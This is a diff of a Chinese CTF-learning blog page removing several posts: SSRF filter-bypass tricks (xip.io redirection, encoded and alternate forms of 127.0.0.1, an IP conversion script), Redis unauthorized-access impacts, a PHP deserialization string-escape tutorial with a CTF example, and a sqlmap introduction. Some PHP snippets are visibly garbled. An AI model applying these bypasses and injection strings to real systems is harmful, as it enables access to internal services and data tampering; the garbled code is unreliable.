-<p>（1）网络上存在一个很神奇的服务，网址为 <a target="_blank" rel="noopener" href="http://xip.io,当访问这个服务的任意子域名的时候,都会重定向到这个子域名/">http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名</a></p>
-<p>举个例子：</p>
-<p>当我们访问：<a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io/flag.php%E6%97%B6%EF%BC%8C%E5%AE%9E%E9%99%85%E8%AE%BF%E9%97%AE%E7%9A%84%E6%98%AFhttp://127.0.0.1/1.php%E3%80%82">http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php。</a></p>
-<p>像这种网址还有<a target="_blank" rel="noopener" href="http://nip.io,http//sslip.io">http://nip.io，http://sslip.io</a></p>
-<p> （2）短地址跳转绕过，</p>
-<h2 id="进制的转换绕过内网IP"><a href="#进制的转换绕过内网IP" class="headerlink" title="进制的转换绕过内网IP"></a>进制的转换绕过内网IP</h2><p>可以使用一些不同的进制替代ip地址，从而绕过WAF</p>
-<p>这里贴一个php脚本可以一键转换</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = &#x27;127.0.0.1&#x27;;</span><br><span class="line">$ip = explode(&#x27;.&#x27;,$ip);</span><br><span class="line">$r = ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;</span><br><span class="line">if($r &lt; 0) &#123;</span><br><span class="line">$r += 4294967296;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;十进制:&quot;;     </span><br><span class="line">echo $r;</span><br><span class="line">echo &quot;八进制:&quot;;    </span><br><span class="line">echo decoct($r);</span><br><span class="line">echo &quot;十六进制:&quot;;  </span><br><span class="line">echo dechex($r);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="其他各种指向127-0-0-1的地址"><a href="#其他各种指向127-0-0-1的地址" class="headerlink" title="其他各种指向127.0.0.1的地址"></a>其他各种指向127.0.0.1的地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/       # localhost就是代指127.0.0.1</span><br><span class="line">http://0/               # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行</span><br><span class="line">http://[::]:80/           # 在liunx下可用，window测试了下不行</span><br><span class="line">http://127。0。0。1/       # 用中文句号绕过</span><br><span class="line">http://①②⑦.⓪.⓪.①</span><br><span class="line">http://127.1/</span><br><span class="line">http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</p>
-<p>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</p>
-<p>最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/06/19/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">
-                反序列化字符逃逸
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-06-19</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p>
-<h2 id="反序列化特点"><a href="#反序列化特点" class="headerlink" title="反序列化特点"></a>反序列化特点</h2><p>1、php在反序列化时，底层代码是以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾，并且是根据长度判断内容的，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化规则才能成功。例如：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    public $name=<span class="string">&#x27;shy&#x27;</span>;</span><br><span class="line">    public $pass=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lemon = <span class="keyword">new</span> A();</span><br><span class="line">echo serialize($lemon);</span><br><span class="line">#反序列化后的结果为:</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>2、在反序列化过程中长度不对应会报错<br>在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度错误则反序列化就会失败。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=<span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;shy&quot;;s:4:&quot;passs&quot;;s:6:&quot;123456&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize($str));</span><br></pre></td></tr></table></figure>
-<p>结果是bool(false)报错<br>3、可以反序列化类中不存在的元素</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">public $name = <span class="string">&#x27;purplet&#x27;</span>;</span><br><span class="line">public $age = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="string">&#x27;O:4:&quot;user&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;purplet&quot;;</span></span><br><span class="line"><span class="string">s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:6:&quot;gender&quot;;s:3:&quot;boy&quot;;&#125;&#x27;</span>;</span><br><span class="line">print_r(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>最后结果会出现gender,值为boy。</p>
-<h2 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h2><p>一、<strong>本质：闭合</strong><br>二、分为两种情况：1、字符变多；2、字符变少。<br>三、字符变多举例</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">filter</span> (<span class="params">$string</span>) </span>&#123;</span><br><span class="line">$filter =.<span class="string">&#x27;/p/i &#x27;</span> ;</span><br><span class="line"><span class="keyword">return</span> preg replace ($filter, <span class="string">&#x27;WW&#x27;</span>,$str)</span><br><span class="line">&#125;</span><br><span class="line">$username · =. <span class="string">&#x27;purplet&#x27;</span>; #pppppppppppppppp<span class="string">&quot;;</span></span><br><span class="line"><span class="string">$age· =. &quot;</span><span class="number">10</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$user· =·array ($username,$age) ;</span></span><br><span class="line"><span class="string">var dump (serialize ($user));</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;pre&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">$r = filter (serialize($user));var_dump ($r);</span></span><br><span class="line"><span class="string">Lvar dump(unserialize ($r));</span></span><br></pre></td></tr></table></figure>
-<p>这里是一个p换成两个w，结果会报错<br><img src="https://img-blog.csdnimg.cn/20210610161157315.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候我要改变age的值，就需要利用反序列化字符逃逸，用16个p填充user，然后在后面加上”;i:1;s:2:”20”;}</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	<span class="comment">//过滤函数</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$filter = <span class="string">&#x27;/p/i&#x27;</span>;</span><br><span class="line">		<span class="comment">//正则匹配，表示变量string中的p（由filter决定）会被替换成WW</span></span><br><span class="line">		<span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;WW&#x27;</span>,$string);</span><br><span class="line">	&#125;</span><br><span class="line"> 	$username = <span class="string">&#x27;purplet&#x27;</span>;</span><br><span class="line"> 	$age = <span class="string">&quot;20&quot;</span>;</span><br><span class="line"> 	$user = array($username,$age);<span class="comment">//数组</span></span><br><span class="line"> 	<span class="comment">//序列化后的数值输出</span></span><br><span class="line">	var_dump(serialize($user));</span><br><span class="line">	echo <span class="string">&quot;&lt;pre&gt;&quot;</span>;<span class="comment">//分隔符</span></span><br><span class="line">	<span class="comment">//序列化过滤后的数值赋值给r并输出</span></span><br><span class="line">	$r = filter(serialize($user));</span><br><span class="line">	var_dump($r);</span><br><span class="line">	<span class="comment">//对 序列化过滤后的数值  反序列化</span></span><br><span class="line">	var_dump(unserialize($r));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>2、字符减少<br>与增多不同的是，不仅要构造username,还要构造age。<br>第一步：改变age的值，序列化后为<code>;i:1;s:2:&quot;20&quot;&#125;</code>,符，而此时uesrname的值无法确定，可随意构造<br>第二步：age处传递一个任意数值和双引号进行闭合，即再次传入age = A”;i:1;s:2:”20”;},查看结果<br>第三步：计算选中部分（长度为13）根据过滤后字符缩减情况构造，Demo中每两个p变为1个W，相当于逃逸1位（选中部分即为逃逸字符)所以输入13*2=26个p进行逃逸，即最终传递usernmae=pppppppppppppppppppppppppp,age=A”;i:1;s:2:”20”;}</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目代码</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error reporting(O);<span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public $uname = <span class="string">&#x27;123&quot;;</span></span><br><span class="line"><span class="string">public $password = &#x27;</span>yu22x<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">function filter($string)&#123;</span></span><br><span class="line"><span class="string">return str replace(&#x27;</span>Firebasky<span class="string">&#x27;,&#x27;</span>Firebaskyed<span class="string">&#x27;&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$a = new a();</span></span><br><span class="line"><span class="string">var dump(serialize($a));</span></span><br><span class="line"><span class="string">echo &quot;&lt;pre&gt;&quot;;</span></span><br><span class="line"><span class="string">$r = filter(serialize($a));vardump($r);</span></span><br><span class="line"><span class="string">var dump(unserialize($r));</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>此题要求以get的方式上传password为yussy，但是password无法修改</p>
-<p><img src="https://img-blog.csdnimg.cn/20210610170816968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210610170542714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/06/19/sqlmap/">
-                sqlmap
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-06-19</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>@<a href="sqlmap">TOC</a></p>
-<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p> sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。采用五种独特的SQL注入技术，分别是：</p>
-<p>   1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>   2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>   3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>   4）联合查询注入，可以使用union的情况下的注入。<br>   5）堆查询注入，可以同时执行多条语句的执行时的注入。</p>
-<h2 id="sqlmap的安装"><a href="#sqlmap的安装" class="headerlink" title="sqlmap的安装"></a>sqlmap的安装</h2><p>sqlmap的安装需要python2x的环境，python下载的官网是<a target="_blank" rel="noopener" href="https://www.python.org/downloads/">https://www.python.org/downloads/</a><br><img src="https://img-blog.csdnimg.cn/20210606091011152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可在cmd中查看：<br><img src="https://img-blog.csdnimg.cn/20210606092009460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>，之后下载sqlmap的压缩包，然后解压到python的目录下 即可。sqlmap下载地址：<a target="_blank" rel="noopener" href="http://sqlmap.org/">http://sqlmap.org/</a><br><img src="https://img-blog.csdnimg.cn/20210606092046119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><p>一、<br>1、打开cmd<br>2、<img src="https://img-blog.csdnimg.cn/20210606094915301.png" alt="在这里插入图片描述"></p>
-<p>进入D盘<br>3、<img src="https://img-blog.csdnimg.cn/20210606095143527.png" alt="在这里插入图片描述"></p>
-<p>进入Python27文件<br>4、<img src="https://img-blog.csdnimg.cn/20210606095442775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 二、sqlmap直接连接数据库<br> 对于服务型数据库（前提是需要知道数据库的用户名和密码）<br> 例如：python sqlmap.py-d”mysql://admin:<a href="mailto:&#x61;&#100;&#109;&#105;&#110;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#49;&#x2e;&#x31;&#x37;">&#x61;&#100;&#109;&#105;&#110;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#49;&#x2e;&#x31;&#x37;</a>:3306/testdb”-f –banner –db –users<br> (bannner信息：欢迎语，在banner信息中可以得到软件开发商，软件名称、版本、服务类型等信息，通过这些信息可以使用某些工具直接去使用相对应的exp去攻击。)<br> sqlmap建议在kali上使用</p>
-
-        </div>
-    
-
-</div>
-            
         </section>
     </div>
 </div>
@@ -609,19 +575,19 @@
         <ul>
             
             <li>
+                <a class="footer-post" href="/2021/08/08/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/">PHP魔术方法</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2021/08/08/PHP%E4%B8%8D%E6%AD%BB%E9%A9%AC/">PHP不死马</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2021/08/08/buuctf_php/">buuctf_php</a>
+            </li>
+            
+            <li>
                 <a class="footer-post" href="/2021/08/01/%E8%AE%A1%E7%BD%91%E7%BD%91%E7%BB%9C%E7%AF%87/">计网网络篇</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/07/25/buuctf(%E4%BA%8C)/">buuctf（二）</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/07/25/beef/">beef</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/07/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">图片隐写</a>
             </li>
             
         </ul>
